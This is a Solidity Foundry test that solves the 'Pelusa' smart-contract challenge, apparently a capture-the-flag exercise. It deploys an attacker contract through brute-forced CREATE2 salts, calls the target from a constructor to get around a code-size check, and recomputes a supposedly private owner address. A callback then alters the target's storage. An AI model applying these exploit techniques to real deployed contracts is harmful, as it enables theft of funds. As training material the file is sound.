// SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

import {Test, console} from "@forge-std/Test.sol";
import {Pelusa} from "../src/Pleusa.sol";

interface IGame {
    function getBallPossesion() external view returns (address);
}

contract Attacker is IGame{
    address owner = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(msg.sender, bytes32(0))
                    )
                )
            )
        );
    uint256 slot1;
    Pelusa pleusa;

    constructor(Pelusa _pleusa) {
        pleusa = _pleusa;
        pleusa.passTheBall();
    }

    function getBallPossesion() external view returns (address){
        return owner;
    }

    function handOfGod() external returns (uint256) {
        slot1++;
        return 22_06_1986;
    }
}
contract PleusaTest is Test {
    Pelusa pleusa;
    function setUp() external {
        
        pleusa = new Pelusa();
    }
    function computeAddress(bytes32 salt, Pelusa _pleusa) public view returns (address) {
        bytes memory bytecode = abi.encodePacked(
            type(Attacker).creationCode,
            abi.encode(
                _pleusa
            )
        );
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this),
                salt,
                keccak256(bytecode)
            )
        );
        return address(uint160(uint256(hash)));
    }
    function findAndDeploy(
        uint256 startSalt,
        uint256 maxTries,
        Pelusa _pleusa
    ) public returns (address, bytes32) {
        for (uint256 i = startSalt; i < startSalt + maxTries; i++) {
            bytes32 salt = bytes32(i);
            address predicted = computeAddress(salt , _pleusa);

            if (uint256(uint160(predicted)) % 100 == 10) {
                address deployed = address(new Attacker{salt: salt}(_pleusa));
                return (deployed, salt);
            }
        }
        revert("No matching salt found in range");
    }

    function test_Pleusa() public {
        // pleusa.passTheBall();
        vm.startPrank(msg.sender);
        address owner = address(
            uint160(
                uint256(keccak256(abi.encodePacked(msg.sender, bytes32(0))))
            )
        );
        vm.stopPrank();
        console.log("owner : ", owner);

        // vm.startPrank(owner);
        (address attackerAddr , ) = findAndDeploy(1 , 10000 , pleusa);

        console.log("attacker Addr : " , attackerAddr);

        pleusa.shoot();
        // vm.stopPrank();
        assert(pleusa.goals() == 2);
    }
}
